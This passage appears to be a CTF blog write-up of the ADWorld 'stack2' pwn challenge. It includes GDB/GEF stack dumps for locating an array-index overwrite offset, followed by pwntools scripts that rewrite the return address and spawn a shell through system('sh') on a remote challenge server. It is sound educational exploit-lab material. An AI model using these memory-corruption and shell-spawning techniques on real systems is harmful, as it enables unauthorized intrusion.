+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+<p>So <code>v13</code> may be at <code>ebp-0x70</code> but <code>ret addr</code> may not be at <code>ebp-0x70+0x4</code> (due to the canary). The truth is: the exact offset can only be confirmed after dynamic debugging.<br>We have to find out which part of the <code>stack</code> is <code>ret addr</code>, and where is array <code>v13</code> saved, then calculate the offset.</p>
+<p>First we seek where <code>v13</code> is. I choose to input a unique number, then locate it on the stack. Since it is little-endian, we input <code>4</code> numbers: <code>120</code>(<code>0x78</code>), <code>86</code>(<code>0x56</code>), <code>52</code>(<code>0x34</code>) and <code>18</code>(<code>0x12</code>). Next search <code>0x12345678</code> on the <code>main()</code> stack frame: </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./stack2 -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef` to start, `gef config` to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./stack2...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./stack2)</span><br><span class="line">gef➤  b main</span><br><span class="line">Breakpoint 1 at 0x80485de</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/stack2</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x0804871e <span class="keyword">in</span> main ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────── registers ────</span><br><span class="line"><span class="variable">$eax</span>   : 0x1</span><br><span class="line"><span class="variable">$ebx</span>   : 0x0</span><br><span class="line"><span class="variable">$ecx</span>   : 0x0</span><br><span class="line"><span class="variable">$edx</span>   : 0xffffd31c  →  0x00000005</span><br><span class="line"><span class="variable">$esp</span>   : 0xffffd2f0  →  0x08048a97  →  0x47006425 (<span class="string">&quot;%d&quot;</span>?)</span><br><span class="line"><span class="variable">$ebp</span>   : 0xffffd3a8  →  0x00000000</span><br><span class="line"><span class="variable">$esi</span>   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line"><span class="variable">$eip</span>   : 0x0804871e  →  &lt;main+334&gt; add esp, 0x10</span><br><span class="line"><span class="variable">$eflags</span>: [zero carry parity adjust SIGN <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x0023 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x002b <span class="variable">$es</span>: 0x002b <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0063</span><br><span class="line">─────────────────── stack ────</span><br><span class="line">0xffffd2f0│+0x0000: 0x08048a97  →  0x47006425 (<span class="string">&quot;%d&quot;</span>?)    ← <span class="variable">$esp</span></span><br><span class="line">0xffffd2f4│+0x0004: 0xffffd31c  →  0x00000005</span><br><span class="line">0xffffd2f8│+0x0008: 0x00000002</span><br><span class="line">0xffffd2fc│+0x000c: 0x00000000</span><br><span class="line">0xffffd300│+0x0010: 0x080482fa  →  <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">0xffffd304│+0x0014: 0xf7fde875  →   add esp, 0x30</span><br><span class="line">0xffffd308│+0x0018: 0x08048238  →  0x00000062 (<span class="string">&quot;b&quot;</span>?)</span><br><span class="line">0xffffd30c│+0x001c: 0xffffd37c  →  0xf7e1665e  →   add esp, 0x10</span><br><span class="line">──────────────── code:x86:32 ────</span><br><span class="line">    0x8048713 &lt;main+323&gt;       push   eax</span><br><span class="line">    0x8048714 &lt;main+324&gt;       push   0x8048a97</span><br><span class="line">    0x8048719 &lt;main+329&gt;       call   0x8048480 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> →  0x804871e &lt;main+334&gt;       add    esp, 0x10</span><br><span class="line">    0x8048721 &lt;main+337&gt;       mov    eax, DWORD PTR [ebp-0x8c]</span><br><span class="line">    0x8048727 &lt;main+343&gt;       cmp    eax, 0x2</span><br><span class="line">    0x804872a &lt;main+346&gt;       je     0x80487a1 &lt;main+465&gt;</span><br><span class="line">    0x804872c &lt;main+348&gt;       cmp    eax, 0x2</span><br><span class="line">    0x804872f &lt;main+351&gt;       ja     0x804873b &lt;main+363&gt;</span><br><span class="line">────────────────── threads ────</span><br><span class="line">[<span class="comment">#0] Id 1, Name: &quot;stack2&quot;, stopped 0x804871e in main (), reason: SINGLE STEP</span></span><br><span class="line">─────────────────── trace ────</span><br><span class="line">[<span class="comment">#0] 0x804871e → main()</span></span><br><span class="line">─────────────────────────────</span><br><span class="line">gef➤  x/100x 0xffffd2f0</span><br><span class="line">0xffffd2f0:     0x08048a97      0xffffd31c      0x00000002      0x00000000</span><br><span class="line">0xffffd300:     0x080482fa      0xf7fde875      0x08048238      0xffffd37c</span><br><span class="line">0xffffd310:     0xf7ffdaa0      0x00000001      0x00000004      0x00000005</span><br><span class="line">0xffffd320:     0x00000012      0x00000004      0x00000000      0x00000004</span><br><span class="line">0xffffd330:     0x00000000      0x00000000      0x12345678      0xf7ffc800</span><br><span class="line">0xffffd340:     0xffffd390      0x00000000      0xf7ffd000      0x00000000</span><br><span class="line">0xffffd350:     0x00000000      0xffffd454      0xf7fbf000      0xf7fbda80</span><br><span class="line">0xffffd360:     0x00000000      0xf7fbf000      0xf7ffc800      0xf7fc2c88</span><br><span class="line">0xffffd370:     0xf7fbf000      0xf7fe4140      0x00000000      0xf7e1665e</span><br><span class="line">0xffffd380:     0xf7fbf3fc      0x00080000      0x00000007      0x0804894b</span><br><span class="line">0xffffd390:     0x00000001      0xffffd454      0xffffd45c      0xe4826000</span><br><span class="line">0xffffd3a0:     0xf7fe4140      0xffffd3c0      0x00000000      0xf7dfdef1</span><br><span class="line">0xffffd3b0:     0xf7fbf000      0xf7fbf000      0x00000000      0xf7dfdef1</span><br><span class="line">0xffffd3c0:     0x00000001      0xffffd454      0xffffd45c      0xffffd3e4</span><br><span class="line">0xffffd3d0:     0x00000001      0x00000000      0xf7fbf000      0x00000000</span><br><span class="line">0xffffd3e0:     0xf7ffd000      0x00000000      0xf7fbf000      0xf7fbf000</span><br><span class="line">0xffffd3f0:     0x00000000      0x13b16d8e      0x53ab8b9e      0x00000000</span><br><span class="line">0xffffd400:     0x00000000      0x00000000      0x00000001      0x080484a0</span><br><span class="line">0xffffd410:     0x00000000      0xf7fe92c0      0xf7fe4140      0xf7ffd000</span><br><span class="line">0xffffd420:     0x00000001      0x080484a0      0x00000000      0x080484c1</span><br><span class="line">0xffffd430:     0x080485d0      0x00000001      0xffffd454      0x08048900</span><br><span class="line">0xffffd440:     0x08048960      0xf7fe4140      0xffffd44c      0x0000001c</span><br><span class="line">0xffffd450:     0x00000001      0xffffd576      0x00000000      0xffffd583</span><br><span class="line">0xffffd460:     0xffffd593      0xffffd5ae      0xffffd5de      0xffffd5f3</span><br><span class="line">0xffffd470:     0xffffd5fd      0xffffd60a      0xffffd619      0xffffd622</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
+<p>Copy them to a single file: <code>stackmemory</code>, and <code>grep</code> it:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat stackmemory |grep 12345678</span><br><span class="line">0xffffd330:     0x00000000      0x00000000      0x12345678      0xf7ffc800</span><br></pre></td></tr></table></figure>
+<p>So <code>v13</code> starts at <code>0xffffd338</code>.</p>
+<p>Then we need to know where is the <code>ret addr</code>. Its value will be the <code>eip</code> register after this function’s <code>ret</code>, and its location will be the <code>esp</code> before <code>ret</code>.</p>
+<p>Set a breakpoint before <code>ret</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0x080488f2 in main ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────── registers ────</span><br><span class="line">$eax   : 0x0</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0xffffd3c0  →  0x00000001</span><br><span class="line">$edx   : 0xffffd31c  →  0x00000005</span><br><span class="line">$esp   : 0xffffd3bc  →  0xf7dfdef1  →  &lt;__libc_start_main+241&gt; add esp, 0x10</span><br><span class="line">$ebp   : 0x0</span><br><span class="line">$esi   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">$edi   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">$eip   : 0x080488f2  →  &lt;main+802&gt; ret</span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">───────────────────── stack ────</span><br><span class="line">0xffffd3bc│+0x0000: 0xf7dfdef1  →  &lt;__libc_start_main+241&gt; add esp, 0x10         ← $esp</span><br><span class="line">0xffffd3c0│+0x0004: 0x00000001</span><br><span class="line">0xffffd3c4│+0x0008: 0xffffd454  →  0xffffd576  →  &quot;/root/stack2&quot;</span><br><span class="line">0xffffd3c8│+0x000c: 0xffffd45c  →  0xffffd583  →  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd3cc│+0x0010: 0xffffd3e4  →  0x00000000</span><br><span class="line">0xffffd3d0│+0x0014: 0x00000001</span><br><span class="line">0xffffd3d4│+0x0018: 0x00000000</span><br><span class="line">0xffffd3d8│+0x001c: 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">─────────────── code:x86:32 ────</span><br><span class="line">    0x80488ea &lt;main+794&gt;       dec    DWORD PTR [ebx-0x723603b3]</span><br><span class="line">    0x80488f0 &lt;main+800&gt;       popa</span><br><span class="line">    0x80488f1 &lt;main+801&gt;       cld</span><br><span class="line"> →  0x80488f2 &lt;main+802&gt;       ret</span><br><span class="line">   ↳  0xf7dfdef1 &lt;__libc_start_main+241&gt; add    esp, 0x10</span><br><span class="line">      0xf7dfdef4 &lt;__libc_start_main+244&gt; sub    esp, 0xc</span><br><span class="line">      0xf7dfdef7 &lt;__libc_start_main+247&gt; push   eax</span><br><span class="line">      0xf7dfdef8 &lt;__libc_start_main+248&gt; call   0xf7e163d0 &lt;exit&gt;</span><br><span class="line">      0xf7dfdefd &lt;__libc_start_main+253&gt; push   esi</span><br><span class="line">      0xf7dfdefe &lt;__libc_start_main+254&gt; push   esi</span><br><span class="line">─────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;stack2&quot;, stopped 0x80488f2 in main (), reason: SINGLE STEP</span><br><span class="line">───────────────────── trace ────</span><br><span class="line">[#0] 0x80488f2 → main()</span><br><span class="line">────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
+<p>We can see <code>esp</code> = <code>0xffffd3bc</code>. So <code>ret addr</code> is in <code>0xffffd3bc</code> on the stack.</p>
+<p>Offset/Index = <code>0xffffd3bc</code> - <code>0xffffd338</code> = <code>0x84</code> = <code>132</code></p>
+<p>Another method to calculate the offset is: get <code>ebp</code> after stepping into <code>main()</code>, then get <code>esp</code> before <code>ret</code>, the offset should be: offset/index = <code>esp</code> - <code>v13</code> = <code>esp</code> - (<code>ebp</code> - <code>0x70</code>).</p>
+<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>Origianl script was:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">34138</span>)</span><br><span class="line"></span><br><span class="line">hackhere = <span class="string">&#x27;0x0804859B&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr, num</span>):</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x9b</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x85</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>While it went wrong:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python stack2.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./stack2&#x27;</span>: pid 4024</span><br><span class="line">[+] Opening connection to 220.249.52.133 on port 34138: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">1. show numbers</span><br><span class="line">2. add number</span><br><span class="line">3. change number</span><br><span class="line">4. get average</span><br><span class="line">5. <span class="built_in">exit</span></span><br><span class="line">sh: 1: /bin/bash: not found</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<p>As <code>sh: 1: /bin/bash: not found</code>, we can only build another system call by using <code>rop</code> gadgets. We can build <code>system(&#39;sh&#39;)</code> using the last two chars of <code>/bin/bash</code>, so the final exploit goes like:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">34138</span>)</span><br><span class="line">hackhere = <span class="string">&#x27;0x0804859B&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr, num</span>):</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line">change(<span class="number">0x8c</span>, <span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">change(0x84, 0x9b)</span></span><br><span class="line"><span class="string">change(0x85, 0x85)</span></span><br><span class="line"><span class="string">change(0x86, 0x04)</span></span><br><span class="line"><span class="string">change(0x87, 0x08)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/08/07/2020-08-07-ADWorld-PWN-Challenge-Area-Write-ups-ret2libc/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (ret2libc)</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/07/24/2020-07-24-ADWorld-PWN-Exercise-Area-Write-ups/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ADWorld PWN Exercise Area Write-ups</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup"><span class="nav-number">1.</span> <span class="nav-text">warmup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reactor-switch"><span class="nav-number">2.</span> <span class="nav-text">reactor switch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-1"><span class="nav-number">2.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#forgot"><span class="nav-number">3.</span> <span class="nav-text">forgot</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-2"><span class="nav-number">3.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-2"><span class="nav-number">3.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack2"><span class="nav-number">4.</span> <span class="nav-text">stack2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-3"><span class="nav-number">4.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-3"><span class="nav-number">4.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-3"><span class="nav-number">4.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
